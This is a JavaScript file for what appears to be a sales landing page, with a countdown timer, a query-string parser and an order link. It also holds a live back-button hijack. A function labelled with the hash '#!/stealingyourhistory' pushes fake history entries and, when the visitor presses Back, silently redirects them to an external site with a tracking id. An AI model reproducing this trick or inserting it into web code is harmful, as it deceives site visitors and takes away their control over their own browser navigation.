/**
 * Created by Administrator on 2017/4/28 0028.
 */
 setInterval(getRTime, 100);
//倒计时
function GetDateStr(AddDayCount) {
    var dd = new Date();
    dd.setDate(dd.getDate() + AddDayCount);//获取AddDayCount天后的日期
    var y = dd.getFullYear();
    var m = dd.getMonth() + 1;//获取当前月份的日期
    var d = dd.getDate();
    return y + "/" + m + "/" + d;
}
function getRTime() {
    var NowTime = new Date();
    var t = EndTime - NowTime.getTime();
    if (t > 0) {
        var h = Math.floor(t / 1000 / 60 / 60);
        var m = Math.floor(t / 1000 / 60 % 60);
        var s = Math.floor(t / 1000 % 60);
        var w = Math.floor(t / 100 % 10);
        document.getElementById("J_TimeHour").innerHTML = (Array(2).join(0) + h).slice(-2);
        document.getElementById("J_TimeMin").innerHTML = (Array(2).join(0) + m).slice(-2);
        document.getElementById("J_TimeSec").innerHTML = (Array(2).join(0) + s).slice(-2);
        document.getElementById("J_TimeWSec").innerHTML = (Array(2).join(0) + w).slice(-2);
    }
}
function getQueryString(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return null;
}

var localurl = document.location.href;
document.getElementById("backid").value = getQueryString('id');

(function (window, location) {

    var aaa=history.replaceState(null, document.title, location.pathname + "#!/stealingyourhistory");
    console.log(aaa);
    var bbb=history.pushState(null, document.title, location.pathname);
    console.log(bbb);
    window.addEventListener("popstate", function () {

        if (location.hash === "#!/stealingyourhistory") {

            history.replaceState(null, document.title, location.pathname);

            setTimeout(function () {

                location.replace("http://www.timesenz.com/meyy/?id=m-"+ document.getElementById("backid").value );

            }, 0);
        }
    }, false);
}(window, location));


function getUrl() {
    window.location.href = "order.htm?id=" + document.getElementById("backid").value;
}